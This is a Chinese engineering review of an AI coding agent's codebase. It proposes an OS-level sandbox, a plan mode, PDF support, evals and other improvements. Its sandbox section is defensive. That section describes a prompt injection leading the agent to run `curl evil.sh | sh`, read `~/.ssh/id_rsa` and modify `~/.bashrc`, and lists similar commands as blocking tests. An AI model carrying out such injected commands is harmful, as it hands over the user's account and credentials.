## 一、结论摘要

## 二、P0 · 安全与正确性（建议优先）

### P0-1 缺少操作系统级沙箱 —— 当前最大结构性风险

**证据**

- `internal/core/permission/gate_rules.go:222` 的 `outsideAllowedPaths` 只对 `bash / read_file / write_file / edit / search_replace / ls / grep / glob` 且 `action.Path != ""` 时生效。而 bash 工具的自由命令通常**没有**独立 path 参数。
- `internal/core/tool/tools_bash.go:165` 直接 `exec.Command`，`cmd.Dir` 可指定，**环境变量完整继承**，没有任何 OS 级隔离。
- `internal/core/permission/bashsec.go` 是 23 条正则/模式规则，能拦已知危险形态，但正则追不上构造型命令。
- 全仓检索 `landlock | seatbelt | sandbox-exec | bwrap | AppContainer` **零命中**。

**为什么这是 P0**

在 `YOLO` 模式下（或用户在 `Agent` 模式连续批准后），一次提示注入即可让模型执行 `curl evil.sh | sh`、读 `~/.ssh/id_rsa`、写 `~/.bashrc` / 启动项。文件工具的白名单约束不到 shell，这是"批准一次 = 交出整个账户"的结构性问题。对标产品把这一层放在 OS 内核/系统调用边界，而不是提示词与正则。

**方案**

新增 `internal/sandbox`，定义统一策略并做三平台适配：

| 平台 | 机制 | 最低可用形态 |
|---|---|---|
| Linux | Landlock（`golang.org/x/sys/unix`，ABI v1+），可选叠加 seccomp | 工作区可写、`/tmp` 可写、其余只读；网络默认拒绝或域名白名单 |
| macOS | `sandbox-exec` 生成临时 profile（或 Seatbelt cgo 绑定） | 同上 |
| Windows | `CreateRestrictedToken` + AppContainer + Job Object | 最低限度：受限令牌 + 工作区 ACL，禁止访问用户目录与注册表敏感键 |

配套：

- 配置项 `security.sandbox: auto|on|off`（默认 `auto` = 支持就开），`off` 时启动与每次 YOLO 回合打印醒目警告。
- 沙箱不可用时**明示降级**（例如"当前平台无内核沙箱，仅路径白名单"），不静默假装安全。
- 网络策略与现有 `internal/netsec` 复用：默认允许已配置的模型/搜索域名，其余 `ask`。

**验收标准**

1. 沙箱内 `bash -c 'echo x > ~/outside.txt'` 被拒绝且错误可读。
2. `cat ~/.ssh/id_rsa`、`cat %APPDATA%\...` 被拒绝。
3. `go build ./...` / `npm test` / `git status` 在沙箱内正常。
4. `security.sandbox: off` 时行为回到今天，且有警告。

**规模**：L（三平台各一套适配 + 策略 + 测试）。建议独立分支、逐平台验收。

### P0-2 模型不能主动进入计划模式

**证据**

- 权限门支持 `ModePlan`（`permission/gate.go:37`），`/plan` 命令存在；但 38 个工具里**没有任何 plan 相关工具**（全仓检索 `ExitPlanMode`、`exit_plan_mode` 零命中）。
- 结果是：只有用户先手动切模式，模型才会在只读态工作；模型读到复杂需求时**无法自己提出"我先给方案，你批准再动手"**。

**方案**

新增两个工具，并与权限门联动：

- `enter_plan_mode`：模型主动切只读；系统提示追加"先调研并输出计划，不要修改文件"。
- `exit_plan_mode`：提交结构化计划（目标 / 步骤 / 影响文件 / 风险 / 验证方式），返回 `plan_approval` 事件；桌面与 TUI 渲染计划卡片，批准后自动切回 `agent` 模式并继续。
- 未批准则保持只读，模型可修订计划再次提交（限制次数，防死循环）。

**验收标准**：给一个跨 3 个文件的重构需求，模型在不被手动切模式的情况下，先出计划、等待批准、再执行；拒绝时全程零写入。

**规模**：M。

### P0-3 PDF / 文档输入链路是断的

**证据**

- `internal/types/types.go:42` 注释明确写着 `"image", "pdf"`。
- `internal/llm/provider/openai_compat/base.go:1092` 与 `internal/llm/provider/anthropic/anthropic.go:726` 均只有 `if att.Type == "image"`，**PDF 分支不存在**。
- 桌面端只收集图片：`desktop/src/pages/ChatPage.tsx:900` 的 `attachedImages.map(img => ({ type: 'image', ... }))`。
- `read_file` 描述里也只承诺 png/jpeg/gif/webp/bmp（`tools_file.go:23`）。

**影响**：这个类型字段是"声明了但从不产生、也从不消费"的死链路。用户若通过 API 传 PDF，会被**静默丢弃**——模型回答时完全不知道有附件，比报错更糟。

**方案（按投入递增）**

1. **最小正确性**（S）：遇到非 image 附件时返回明确错误/提示"该格式暂不支持"，不再静默丢弃。
2. **Anthropic 原生 PDF**（M）：`anthropicContent` 增加 `{"type":"document","source":{"type":"base64","media_type":"application/pdf","data":...}}`。
3. **本地抽取兜底**（M）：新增 `read_pdf` 工具，纯 Go 解析文本层（扫描件走 OCR 可后置）；对所有厂商通用，也顺带解决"模型要读 PDF"的工具缺口。
4. **桌面入口**（S）：上传 accept 增加 `.pdf`，卡片展示文件名/页数。

**验收标准**：拖入一份 10 页 PDF → 模型能准确引用第 3 页的条款；不支持该能力的模型收到明确提示而非空附件。

**规模**：S～M（取决于是否做 OCR）。

## 三、P1 · 能力对标（决定"像不像专业智能体"）

### P1-1 建立任务级评测体系（没有度量就没有对标）

**现状**：`grep '^func Test'` 共 1,140 项，覆盖单元与集成；但没有"给一个真实仓库 + 一个任务 → 判定是否完成"的端到端评测。于是三个关键卖点无法被证伪或回归：

- 缓存优先 / 5 层压缩到底省了多少 token；
- `routing.mode: embedding` 的路由是否真的更优；
- 换模型、改提示词、改工具描述后，任务成功率是升是降。

**方案**

- 新建 `evals/`：20～30 个任务，覆盖修 bug、加测试、跨文件重构、读日志定位、文档生成五类；每个任务含仓库快照、验收脚本、预算上限。
- 驱动用现成的 `icode exec -p ... --output-format json`，采集：pass@1、工具轮数、输入/输出 token、缓存命中、耗时、估算成本。
- CI 夜间跑（不进 PR 阻塞），产出 `evals/report-<version>.md` 趋势表；发版前人工看回归。

**验收标准**：每个版本有一份可对比的评测表；任一维度回退 >5% 时报告标红。

**规模**：M（任务设计比代码更费时间）。

### P1-2 会话检索升级到 FTS5

**证据**：`internal/db/store.go:466` — `SearchMessages` 注释直接写 "using LIKE"。

**问题**：消息量上来后全表扫；无相关性排序；无法按会话/时间/角色过滤；中文分词缺失导致短词命中噪声大。

**方案**：SQLite FTS5 虚表 + 触发器同步（`unicode61` 分词 + 可选 `simple` 分词器处理中文）；`/api/search` 增加 `session_id`、`from/to`、`role`、`limit` 参数；前端结果高亮与跳转定位。

**验收标准**：1 万条消息检索 <50ms；结果按 BM25 排序；中文双字词可命中。

**规模**：S～M（含迁移与回填）。

### P1-3 CodeGraph 多语言化

**证据**：`internal/core/codegraph/codegraph_test.go:188` 明确断言 `.py` 不产出符号——即当前**只支持 Go 与 TS/JS**。

**影响**：在 Python / Rust / Java / Kotlin / C# 项目里，`code_search` 基本失效，模型退回 grep，跨文件重构质量下降。

**方案（择一或组合）**

- 引入 tree-sitter（纯 Go 绑定或 CGO）覆盖主流语言；
- 或复用已接入的 LSP：用 `textDocument/documentSymbol` 建索引，语言覆盖随本机 server 自动扩展；
- 保留现有正则实现作为无 LSP 时的兜底。

**验收标准**：在一个 Python 仓库里问"`parse_config` 在哪定义"，Top-3 命中率 >90%；索引构建对 5 万行仓库 <5s。

**规模**：M～L。

### P1-4 浏览器工具从"看"升级到"操作"

**证据**：`internal/core/tool/browser.go` 只有 `dump` 与 `screenshot`（第 32 行 enum 仅两个值），底层是 `--dump-dom` / `--screenshot`。

**差距**：无法点击、填表、多步导航、读取网络响应，因此"帮我登录后台查一下订单"这类任务做不了。

**方案**：CDP 直连本机 Edge/Chrome（`--remote-debugging-port` + WebSocket），提供 `navigate / click / fill / press / extract_text / wait_for / screenshot`；保留无头 dump 作为轻量兜底；所有动作仍走权限门（域名白名单 + 写操作确认）。

**验收标准**：能完成"打开站点 → 搜索关键词 → 取回前 3 条结果"的三步任务；失败时返回可诊断错误（选择器不存在/超时/被拦截）。

**规模**：L。

## 四、P2 · 工程健康与体验

### P2-1 后台任务缺少资源上限

`internal/core/tool/bgtask.go` 有 `maxBuf` 单任务缓冲上限，但**没有并发任务数上限**，也没有总内存上限与已完成任务回收策略。在 4 GB 内存的开发机上，多个长跑命令（构建、测试、日志 tail）并存会显著挤占内存。

**方案**：默认并发上限 8（可配），总缓冲上限 64 MB，LRU 回收已结束任务；超限返回"请先取消某个任务"的可操作错误，而不是直接 OOM。

**规模**：S。

### P2-2 成本治理只有 token，没有金额

`internal/core/sessionum/budget.go` 只有 `budget_tokens`。用户真正关心的是"这次/今天花了多少钱"。

**方案**：在已有定价表基础上增加按会话/按日的金额上限，80% 预警、100% 硬停并保留当前回合；分析页展示"今日花费 / 上限"。

**规模**：S～M。

### P2-3 文档与版本缺少单一真源

具体不一致（已逐条核对）：

| 位置 | 现状 | 实际 |
|---|---|---|
| `ICODE.md:5` | "当前版本 v0.1.0" | `version.go` = 0.1.4 |
| `README_zh.md:248` 路线图 | 把 CSRF/SSRF/目录沙箱/注册表加锁/API Key 脱敏列为"下一阶段" | CHANGELOG v0.1.3 记录**已落地**；`netsec`、`config` 锁、`gate_rules` 均已在位 |
| `ICODE.md:205` | 同样把这些列为"下一阶段" | 同上 |

**方案**：CI 增加一条 `make docs-check`：解析 `version.go`，与 README/ICODE 中的版本号比对；路线图条目改为引用 CHANGELOG 锚点，不再手写状态。文档里"已完成/未完成"只允许有 CHANGELOG 一个出处。

**规模**：S。

### P2-4 跨平台产品化

- macOS / Linux 桌面是"托盘 + 系统浏览器"，不是原生窗口；
- 托盘与全局热键依赖 CGO，`ICODE.md:203` 自述"仅无头环境验证编译与单测，真实交互待点测"；
- `computer_use` / `screenread` 为 Windows 专属（`computeruse_other.go`、`screenread_other.go` 是 stub）；
- 发布流水线无 macOS 签名/公证。

**方案**：优先做 macOS 公证（否则用户首次打开会被 Gatekeeper 拦），再评估 WKWebView / WebKitGTK 原生窗；computer-use 用 AXUIElement（macOS）与 X11（Linux）补齐，或明确在 UI 标注"仅 Windows"。

**规模**：M～L。

### P2-5 可观测性缺位

全仓无 `log/slog`、无 OpenTelemetry。长回合卡住时，只能靠用户描述与零散 `fmt.Fprintf(os.Stderr, ...)`。

**方案**：结构化日志（本地滚动文件，默认关闭或 info 级）+ 每回合 span（turn / tool / latency / tokens）；可选 OTLP 导出（企业内网），默认不上报，符合项目"从不发送遥测"的原则。

**规模**：M。

### P2-6 插件体系仍偏薄

`internal/core/plugins/plugins.go` 共 426 行，无 manifest 版本、依赖、权限声明与签名校验。技能（SKILL.md）已市场化，但"代码级扩展"（工具/钩子/连接器）还没有对等机制。

**方案**：插件 manifest（name/version/entry/permissions/engines），加载前校验哈希与可选签名；权限走现有 `Gate`；提供 `/plugin` 列表、启停、诊断。

**规模**：M～L（涉及供应链安全，建议在 P0 沙箱之后做）。

## 五、两处"名不副实"，建议顺手修正

1. **`routing.mode: embedding` 并不是语义向量**
   `internal/core/router/embedding.go:4` 的注释很诚实地说明"用本地哈希特征而不是真实 embedding API"。但配置项与 UI 文案容易让人以为是语义模型。建议：改名为 `hashed-feature`，或在文档中明确"零依赖的轻量特征分类，不是向量检索"，并保留 `llm` 模式作为高精度选项。

2. **`Attachment.Type` 的 pdf 是死字段**
   见 P0-3。要么接通，要么删掉类型注释，避免后来者以为已经支持。
